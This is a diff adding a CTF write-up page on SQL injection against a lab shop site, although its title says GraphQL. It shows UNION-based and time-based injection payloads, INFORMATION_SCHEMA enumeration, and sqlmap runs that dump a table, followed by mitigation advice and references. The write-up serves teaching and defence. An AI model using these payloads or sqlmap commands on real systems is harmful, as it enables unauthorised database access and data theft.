@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="This seventh challenge aims to demonstrate a more than 20 years old bug: the infamous SQL injection. A perfect challenge for beginners. Despite being the source a numerous data breach and exploitation">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Misc CTF - GraphQL Injection">
+<meta property="og:url" content="https://hg8.sh/posts/misc-ctf/sql-injection/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="This seventh challenge aims to demonstrate a more than 20 years old bug: the infamous SQL injection. A perfect challenge for beginners. Despite being the source a numerous data breach and exploitation">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/150655328-e1100b39-73e9-47bc-8154-4152fc53f813.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/150655341-16738d59-11cb-46bc-a218-45dfe2ebeb05.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/150655385-dd97bffe-e899-4ab4-bfba-7588d9b0fa06.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/150655401-ee158f58-cea4-43ec-b9a0-09cd09786a48.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/150655472-8f236d3b-109c-4fe6-8d91-b2728668ae02.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/150655479-17cef252-4ae3-4461-b56c-4147756c3686.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/150655499-39f0adb9-2a6d-4289-99ed-f445b1afc31c.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/150655521-44dfa5bd-b6c5-4ddd-ba54-e6de5e480a38.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/150655558-736b3bc3-9f86-43f8-a78c-443d5956729d.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/150655589-17296254-0cc9-418d-9fb0-651c4955c1a6.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/150655603-271d5fd0-875f-4bb8-9b55-cf8408e708fe.png">
+<meta property="article:published_time" content="2021-03-11T23:00:00.000Z">
+<meta property="article:modified_time" content="2022-01-22T21:15:35.405Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="beginner">
+<meta property="article:tag" content="SQL Injection">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/150655328-e1100b39-73e9-47bc-8154-4152fc53f813.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+     
+    <title>Misc CTF - GraphQL Injection :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/misc-ctf/upload-restriction-bypass/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/sneakymailer/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-Vulnerability"><span class="toc-number">2.</span> <span class="toc-text">SQL Injection Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-easy-way-SQLMap"><span class="toc-number">3.</span> <span class="toc-text">The easy way - SQLMap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mitigation"><span class="toc-number">4.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">5.</span> <span class="toc-text">References</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Real-Life-Example"><span class="toc-number">6.</span> <span class="toc-text">Real Life Example</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Misc CTF - GraphQL Injection
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2021-03-11T23:00:00.000Z" itemprop="datePublished">12-03-2021</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      8 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>This seventh challenge aims to demonstrate a more than 20 years old bug: the infamous SQL injection. A perfect challenge for beginners.</p>
+<p>Despite being the source a numerous data breach and exploitation every years, this vulnerability is still commonly found in a lot of web apps.</p>
+<p><strong>Tl;Dr: Exploiting a SQL Injection on the shop website allows to retrieve a table entry containing the flag.</strong></p>
+<p>Alright! Let’s get into the details now!</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/150655328-e1100b39-73e9-47bc-8154-4152fc53f813.png" alt="little bobby tables"></p>
+<hr>
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Opening the challenge display the following website:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/150655341-16738d59-11cb-46bc-a218-45dfe2ebeb05.png" alt="sql injection misc ctf"></p>
+<p>A simple e-commerce website, you can browse through products, add items to card and place an order. Nothing more.</p>
+<p>Let’s dig a bit.<br>Browsing through the product pages we notice the <code>elements</code> parameter in the URL, probably used for pagination ?</p>
+<p>Let’s see if we can make any type of injection through this parameter before moving to the cart and order function.</p>
+<h2 id="SQL-Injection-Vulnerability"><a href="#SQL-Injection-Vulnerability" class="headerlink" title="SQL Injection Vulnerability"></a>SQL Injection Vulnerability</h2><p>Inputing random value as parameter returns the following message:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/150655385-dd97bffe-e899-4ab4-bfba-7588d9b0fa06.png" alt="sql injection test misc ctf"></p>
+<p>When appending a classical AND 1=1 SQL injection to the elements parameters, the page don’t display errors but load the results normally:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/150655401-ee158f58-cea4-43ec-b9a0-09cd09786a48.png" alt="1=1 sql injection misc ctf"></p>
+<p>To make sure we have a valid SQL Injection let’s try a sleep function injection:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ time curl <span class="string">&quot;http://localhost:8080/?elements=9 OR sleep(5)&quot;</span> </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.14.2</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">X-Powered-By: PHP/5.6.40</span><br><span class="line"></span><br><span class="line">0.01s user 0.01s system 0% cpu 5.978 total</span><br></pre></td></tr></table></figure>
+
+<p>Good since the request took 5 seconds to proceed, we now are 100% sure we have a valid SQL injection here. Let’s see what we can retrieve from the database using this vulnerability.</p>
+<p><strong>Getting to know the current database</strong></p>
+<p>To start off let’s see how to we can manually exploit the SQL injection vulnerability to exfiltrate data. In a second part we will see how to ease the task with automated exploitation tools.</p>
+<p>To retrieve informations from the database we are going to use an <code>UNION</code> attack . Here is a nice explanation of the process:</p>
+<blockquote>
+<p>The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. For example:</p>
+<p><code>SELECT a, b FROM table1 UNION SELECT c, d FROM table2</code></p>
+<p>This SQL query will return a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2.</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/union-attacks">SQL injection UNION attacks | Web Security Academy</a></p>
+</blockquote>
+<p>The first thing we need to do to perform an <code>UNION</code> attack is to determine the number of columns returned from the original query (the products listing query).</p>
+<p>You can do so using two different methods:</p>
+<ol>
+<li><code>ORDER BY</code> clauses injection</li>
+</ol>
+<p>This method consist in injecting an <code>ORDER BY</code> clauses with incremental column index until an error is returned. The advantage of <code>ORDER BY</code> is that we can specify columns index number. This way we don’t have to know the exact column name.</p>
+<p>Let’s give it a try.</p>
+<p>First using <code>ORDER BY 1</code>:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/150655472-8f236d3b-109c-4fe6-8d91-b2728668ae02.png" alt="sql injection misc ctf union 1"></p>
+<p>Looks alright, no error. Let’s do the same for <code>ORDER BY 2</code>, <code>ORDER BY 3</code>, and so on…</p>
+<p>Arriving at <code>ORDER BY 4</code> we finally get the error:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/150655479-17cef252-4ae3-4461-b56c-4147756c3686.png" alt="sql injection misc ctf union 4"></p>
+<p>Behind the scene, the database returns an error, such as:</p>
+<blockquote>
+<p>The ORDER BY position number 4 is out of range of the number of items in the select list.</p>
+</blockquote>
+<p>We now gained the knowledge that the current table contains 3 columns (<code>id</code>, <code>name</code>, <code>price</code> maybe ?)</p>
+<ol>
+<li><code>UNION SELECT</code> injection</li>
+</ol>
+<p>This second method involves submitting a series of <code>UNION SELECT</code> payloads specifying a different number of <code>null</code> values every-times.</p>
+<p>If the number of nulls does not match the number of columns, the database returns an error, such as:</p>
+<blockquote>
+<p>All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.</p>
+</blockquote>
+<p>Again let’s give it a try:</p>
+<p>First, using <code>UNION SELECT NULL</code>:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/150655499-39f0adb9-2a6d-4289-99ed-f445b1afc31c.png" alt="sql injection misc ctf union null"></p>
+<p>We get an error, meaning the table have more than one column.</p>
+<p>Let’s do the same for <code>UNION SELECT NULL,NULL</code>, <code>UNION SELECT NULL,NULL,NULL</code>, and so on…</p>
+<p>Arriving at <code>UNION SELECT NULL,NULL,NULL</code> we don’t get any errors:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/150655521-44dfa5bd-b6c5-4ddd-ba54-e6de5e480a38.png" alt="sql injection misc ctf multiple null union"></p>
+<p>We now confirmed in a different way that the current table contains 3 columns.</p>
+<p><strong>Extracting data using SQL Injection</strong></p>
+<p>Alright we now have all the informations we need to start extracting actual data from the database.</p>
+<p>Let’s see how we can use <code>UNION</code> attack to do so.</p>
+<p>First, we are going to use the following query to get all the databases and tables used by the website:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_schema, table_name <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES</span><br></pre></td></tr></table></figure>
+
+<p>Embed it inside our <code>UNION</code> query gives the following payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> table_schema,table_name,<span class="keyword">NULL</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES</span><br></pre></td></tr></table></figure>
+
+<p>This query should now be able to retrieve all the databases and its table name.<br>Let’s give it a try:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/150655558-736b3bc3-9f86-43f8-a78c-443d5956729d.png" alt="sql injection misc ctf table name"></p>
+<p>Well… This surely looks broken but looking in the details we have all the informations we need, check the source code :</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[...]</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;chop-108&quot;</span> <span class="attr">data-id</span>=<span class="string">&quot;108&quot;</span> <span class="attr">data-price</span>=<span class="string">&quot;30777&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;addToCart(this)&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;image/0108.jpg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>$30777<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;chop-ctf&quot;</span> <span class="attr">data-id</span>=<span class="string">&quot;ctf&quot;</span> <span class="attr">data-price</span>=<span class="string">&quot;chop&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;addToCart(this)&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>$chop<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;chop-information_schema&quot;</span> <span class="attr">data-id</span>=<span class="string">&quot;information_schema&quot;</span> <span class="attr">data-price</span>=<span class="string">&quot;ALL_PLUGINS&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;addToCart(this)&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>$ALL_PLUGINS<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<p>See what’s going here ? The “normal” shop SQL query request for the product <code>id</code> and <code>price</code>, using the <code>id</code> in <code>chop-&lt;product-id&gt;</code> as <code>&lt;div&gt;</code> identifier and showing <code>price</code> in <code>&lt;p&gt;</code> tag.</p>
+<p>In our union query, the store SQL query gets replaced by our <code>UNION</code> query. The chop <code>id</code> is replaced by <code>table_schema</code> and <code>price</code> by <code>table_name</code>.</p>
+<p>While this is not very readable we still gets all the informations we need. We now know that the only database is <code>ctf</code> and contains one table: <code>chop</code>.</p>
+<p>Let’s continue our enumeration to get a list of each columns name in the <code>chop</code> table. We can do so using:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_type,column_name,<span class="keyword">NULL</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;chop&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>Let’s give it a try:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/150655589-17296254-0cc9-418d-9fb0-651c4955c1a6.png" alt="sql injection misc ctf table listing"></p>
+<p>Awesome, we were close with our guessing. Here is all the informations we collected so far:</p>
+<ul>
+<li>Database: <code>ctf</code></li>
+<li>Table: <code>chop</code></li>
+<li>Columns: <code>id</code>, <code>price</code>, <code>image_url</code></li>
+</ul>
+<p>With that in mind let’s list all the lines in this <code>chop</code> database to see if we can find juicy informations:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> id,price,image_url <span class="keyword">FROM</span> chop<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://user-images.githubusercontent.com/9076747/150655603-271d5fd0-875f-4bb8-9b55-cf8408e708fe.png" alt="sql injection misc ctf column listing"></p>
+<p>Hey what’s this last product with price to $0 and broken image ?</p>
+<p>Let’s check the source code:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;chop-109&quot;</span> <span class="attr">data-id</span>=<span class="string">&quot;109&quot;</span> <span class="attr">data-price</span>=<span class="string">&quot;0&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;addToCart(this)&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;FLAG&#123;5ql 1nj3c710n 4r3 571ll w1d3ly u53d!&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>$0<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Bingo!</p>
+<h2 id="The-easy-way-SQLMap"><a href="#The-easy-way-SQLMap" class="headerlink" title="The easy way - SQLMap"></a>The easy way - SQLMap</h2><p>You noticed it. The manual way is not really easy nor fast to operate.</p>
+<p>Thankfully (or unfortunately depending on the point of view) <code>[SQLMap](https://github.com/sqlmapproject/sqlmap)</code>, an open source tools, allows to automate all step of a SQL Injection.</p>
+<p>Let’s have a look at what it is capable on our Chop Shop:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ sqlmap -u <span class="string">&quot;http://192.168.1.21:8080/?elements=9&quot;</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.4.3<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |</span><br><span class="line">|___|_  [,]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[15:32:14] [INFO] testing connection to the target URL</span><br><span class="line">[15:32:15] [INFO] checking <span class="keyword">if</span> the target is protected by some kind of WAF/IPS</span><br><span class="line">[15:32:15] [INFO] testing <span class="keyword">if</span> the target URL content is stable</span><br><span class="line">[...]</span><br><span class="line">[15:32:15] [INFO] GET parameter <span class="string">&#x27;elements&#x27;</span> appears to be <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span> injectable (with --string=<span class="string">&quot;<span class="variable">$81519</span>&quot;</span>)</span><br><span class="line">[15:32:44] [INFO] GET parameter <span class="string">&#x27;elements&#x27;</span> appears to be <span class="string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span> injectable</span><br><span class="line">[15:32:44] [INFO] GET parameter <span class="string">&#x27;elements&#x27;</span> is <span class="string">&#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span> injectable</span><br><span class="line">GET parameter <span class="string">&#x27;elements&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="keyword">if</span> any)? [y/N]</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 68 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: elements (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: elements=9 AND 3739=3739</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: elements=9 AND (SELECT 6385 FROM (SELECT(SLEEP(5)))ZgQe)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: elements=9 UNION ALL SELECT CONCAT(0x71786a7a71,0x52526f7750766c6b734b4c765a464b75514e557956765964446f504e73764d7a744872505a416c44,0x71766a7171),NULL,NULL-- -</span><br><span class="line">---</span><br><span class="line">[15:33:24] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span><br></pre></td></tr></table></figure>
+
+<p>Well that took only a bit more than 30 seconds. SQLMap can also extract all databases and tables:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">&quot;http://192.168.1.21:8080/?elements=9&quot;</span> --tables</span><br><span class="line">[...]</span><br><span class="line">[15:37:31] [INFO] fetching tables <span class="keyword">for</span> databases: <span class="string">&#x27;ctf, information_schema, test&#x27;</span></span><br><span class="line">Database: ctf</span><br><span class="line">[1 table]</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| chop                                  |</span><br><span class="line">+---------------------------------------+</span><br><span class="line"></span><br><span class="line">Database: information_schema</span><br><span class="line">[76 tables]</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| ALL_PLUGINS                           |</span><br><span class="line">| APPLICABLE_ROLES                      |</span><br><span class="line">| CHARACTER_SETS                        |</span><br><span class="line">| CHECK_CONSTRAINTS                     |</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<p>And extract databases content:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ sqlmap -u <span class="string">&quot;http://192.168.1.21:8080/?elements=9&quot;</span> -T chop --dump</span><br><span class="line">[...]</span><br><span class="line">[15:42:03] [INFO] fetching current database</span><br><span class="line">[15:42:03] [INFO] fetching columns <span class="keyword">for</span> table <span class="string">&#x27;chop&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;ctf&#x27;</span></span><br><span class="line">[15:42:03] [INFO] fetching entries <span class="keyword">for</span> table <span class="string">&#x27;chop&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;ctf&#x27;</span></span><br><span class="line">Database: ctf</span><br><span class="line">Table: chop</span><br><span class="line">[109 entries]</span><br><span class="line">+------+-------+--------------------------------------------+</span><br><span class="line">| id   | price | image_url                                  |</span><br><span class="line">+------+-------+--------------------------------------------+</span><br><span class="line">| 100  | 97223 | image/0100.jpg                             |</span><br><span class="line">| 101  | 49541 | image/0101.jpg                             |</span><br><span class="line">| 102  | 35913 | image/0102.jpg                             |</span><br><span class="line">| 103  | 27690 | image/0103.jpg                             |</span><br><span class="line">| 104  | 71432 | image/0104.jpg                             |</span><br><span class="line">| 105  | 23383 | image/0105.jpg                             |</span><br><span class="line">| 106  | 48010 | image/0106.jpg                             |</span><br><span class="line">| 107  | 29452 | image/0107.jpg                             |</span><br><span class="line">| 108  | 30777 | image/0108.jpg                             |</span><br><span class="line">| 109  | 0     | FLAG&#123;5ql 1nj3c710n 4r3 571ll w1d3ly u53d!&#125; |</span><br><span class="line">| 10   | 17528 | image/0010.jpg                             |</span><br><span class="line">| 11   | 91187 | image/0011.jpg                             |</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<p>SQLMap also <a target="_blank" rel="noopener" href="https://sqlmap.org/">features</a>:</p>
+<ul>
+<li>Support to enumerate users, password hashes, privileges, roles, databases, tables and columns.</li>
+<li>Automatic recognition of password hash formats and support for cracking them using a dictionary-based attack.</li>
+<li>Dump database tables entirely.</li>
+<li>Download and upload any file from the database server underlying file system when the database software is MySQL, PostgreSQL or Microsoft SQL Server.</li>
+<li>Execute arbitrary commands and retrieve their standard output.</li>
+<li>And the list continue…</li>
+</ul>
+<p>As you can see SQLMap is an extremely complete and powerful tool, <strong>allowing anyone with little to no real knowledge to perform advanced SQL injection attacks.</strong><br>That’s why it’s very important to be aware of the risks of SQL Injection and why it’s still one of the most common and dangerous vulnerability.</p>
+<h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Primary defenses against SQL Injections:</p>
+<ol>
+<li>Use of Prepared Statements (with Parameterized Queries)</li>
+<li>Use of Stored Procedures</li>
+<li>Whitelist Input Validation</li>
+<li>Escaping All User Supplied Input</li>
+</ol>
+<p>Additional Defenses:</p>
+<ul>
+<li>Enforcing Least Privilege</li>
+<li>Performing Whitelist Input Validation as a Secondary Defense</li>
+</ul>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/SQL_Injection">SQL Injection Software Attack | OWASP Foundation</a></li>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">SQL Injection Prevention Cheat Sheet | OWASP</a></li>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html">Query Parameterization Cheat Sheet | OWASP</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">What is SQL Injection? Tutorial &amp; Examples | Web Security Academy</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/union-attacks">SQL injection UNION attacks | Web Security Academy</a></li>
+</ul>
+<h2 id="Real-Life-Example"><a href="#Real-Life-Example" class="headerlink" title="Real Life Example"></a>Real Life Example</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://hackerone.com/reports/297478">SQL injection in labs.data.gov via User-agent | HackerOne</a></li>
+<li><a target="_blank" rel="noopener" href="https://hackerone.com/reports/488795">SQL injection on U.S. Dept Of Defense | HackerOne</a></li>
